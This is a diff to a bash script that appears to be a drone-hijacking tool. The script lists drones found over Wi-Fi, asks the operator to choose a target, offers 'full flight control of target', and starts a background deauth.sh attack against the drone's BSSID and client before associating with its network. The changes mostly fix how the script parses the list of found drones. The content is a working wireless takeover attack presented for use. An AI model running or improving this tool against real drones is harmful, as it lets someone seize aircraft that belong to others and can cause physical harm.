@@ -20,20 +20,20 @@ else
 	for (( i=1; i<=$NUM_DRONES*4; i+=4 ))
 	do
 		ESSID="`grep -n essid .dronesFound.txt | grep "$i:" | cut -d ":" -f 3 | sed -e 's/^[[:space:]]*//'`"
-		MAC="`grep -n bssid .dronesFound.txt | grep "$[$i+1]:" | cut -d ":" -f 3,4,5,6,7,8 | sed -e 's/^[[:space:]]*//'`"
+		MAC="`grep -n $ESSID -A 4 .dronesFound.txt | grep bssid | cut -d ":" -f 2,3,4,5,6,7 | sed -e 's/^[[:space:]]*//'`"
 		echo -e "\t$LIST_NUM: $ESSID ($MAC)"
 		LIST_NUM=`expr $LIST_NUM + 1`
 	done
 	read -p "Select a drone ESSID to target: " TARGET_NUM
 	LINE=$((`expr $TARGET_NUM \* 4` - 3))
-	TARGET_ESSID=`grep -n essid .dronesFound.txt | grep "$LINE:" | cut -d ":" -f 3 | sed -e 's/^[[:space:]]*//'`
+	TARGET_ESSID=`cat .dronesFound.txt | grep -n "" | grep "$LINE:essid" | cut -d ":" -f 3 | sed -e 's/^[[:space:]]*//'`
 	LINE=$((`expr $TARGET_NUM \* 4` - 2))
-	CHANNEL=`grep -n channel .dronesFound.txt | grep "$LINE:" | cut -d ":" -f 3 | sed -e 's/^[[:space:]]*//'`
+	CHANNEL=`cat .dronesFound.txt | grep -n "" | grep "$LINE:channel" | cut -d ":" -f 3 | sed -e 's/^[[:space:]]*//'`
 	LINE=$((`expr $TARGET_NUM \* 4` - 1))
-	TARGET_MAC=`grep -n bssid .dronesFound.txt | grep "$LINE:" | cut -d ":" -f 3,4,5,6,7,8 | sed -e 's/^[[:space:]]*//'`
+	TARGET_MAC=`cat .dronesFound.txt | grep -n "" | grep "$LINE:bssid" | cut -d ":" -f 3,4,5,6,7,8 | sed -e 's/^[[:space:]]*//'`
 	LINE=$((`expr $TARGET_NUM \* 4`))
-	CLIENT=`grep -n client .dronesFound.txt | grep "$LINE:" | cut -d ":" -f 3,4,5,6,7,8 | sed -e 's/^[[:space:]]*//'`
-	
+	CLIENT=`cat .dronesFound.txt | grep -n "" | grep "$LINE:client" | cut -d ":" -f 3,4,5,6,7,8 | sed -e 's/^[[:space:]]*//'`
+
 	read -p "Would you like full flight control of target (y/n): " FLIGHT
 	if [ "$FLIGHT" == "y" ]
 	then
@@ -42,7 +42,7 @@ else
 		MON_INT=`cat .ints.txt | cut -d " " -f 2 `
 		./deauth.sh $MON_INT $TARGET_MAC $CLIENT >> /dev/null &
 		RPID=$!
-		echo "RPID: ${BLUE}$RPID${NO_COLOR}"
+		echo -e "RPID: ${BLUE}$RPID${NO_COLOR}"
 	fi
 
 	echo -e "Associating with ${GREEN}$TARGET_ESSID${NO_COLOR} over ${YELLOW}$INT${NO_COLOR}"
